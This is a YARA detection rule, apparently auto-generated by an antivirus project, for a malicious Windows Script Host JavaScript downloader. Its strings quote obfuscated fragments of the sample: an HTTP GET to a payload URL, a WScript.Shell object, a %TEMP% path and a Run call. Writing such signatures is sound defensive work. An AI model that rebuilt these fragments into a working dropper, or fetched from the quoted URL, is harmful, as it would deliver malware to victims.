rule sig_20160427_e2aac241c297e6b6fba51f4283e496d6 {
  meta:
    description = "datamaliciousorder - file 20160427_e2aac241c297e6b6fba51f4283e496d6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7968e2e214e1dc1c205628f8cb6cf0ed2da544c37c4cff5de0ce2b22840028f7"

  strings:
    $s1  = "RoopvSceia[IlxafAfogu](\"G\" + \"ET\", \"http://haraccountants.co.uk/k9sjf\", false);" fullword ascii
    $s2  = "function LtzndPqsco() {return TbruuQjack[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7MMiMlE" ascii
    $s3  = "function LtzndPqsco() {return TbruuQjack[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7MMiMlE" ascii
    $s4  = "var TbruuQjack = function ZvfzvBfhxp() {return EorqfKnkbu[QfgncTcqfb](\"WScript\"+\".Shell\");}(), LgqyrJfonf = 11;" fullword ascii
    $s5  = "function IvhfyWbmvu(KezmzAdise, OnnmdAxbhe){CcnvkYlyuh = CcnvkYlyuh * 1; return KezmzAdise - OnnmdAxbhe;};" fullword ascii
    $s6  = "var EorqfKnkbu = this[\"WScript\"];" fullword ascii
    $s7  = "function UyrfwCeccc(){return HnyvbApfky + \"\";};" fullword ascii
    $s8  = "if (RoopvSceia[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function WyszeLaaci() {return ((LdjtxEjisz == true) && (LdjtxEjisz == QstcqEmzlt)) ? 1 : CcnvkYlyuh;};" fullword ascii
    $s10 = "function CsbfyEljrm(){return QfgncTcqfb;};" fullword ascii
    $s11 = "LdjtxEjisz = true; " fullword ascii
    $s12 = "function RecocPbaaa(FwxwfKnivo){TbruuQjack[\"R\"+\"un\"](FwxwfKnivo, CcnvkYlyuh, CcnvkYlyuh);};" fullword ascii
    $s13 = "var AfdjcGsoig = false;" fullword ascii
    $s14 = "function HercmZlylu(FgioaTdcvt) {var PpspbRsalj = (1, 2, 3, 4, 5, FgioaTdcvt); return PpspbRsalj;};" fullword ascii
    $s15 = "var QstcqEmzlt = false;" fullword ascii
    $s16 = "function UxramJpmtl(){return 23;};" fullword ascii
    $s17 = "QstcqEmzlt = true; " fullword ascii
    $s18 = "function YfmjcBjetd()" fullword ascii
    $s19 = "var JmvauIeewk = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "}while (JwspkWqdxz);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}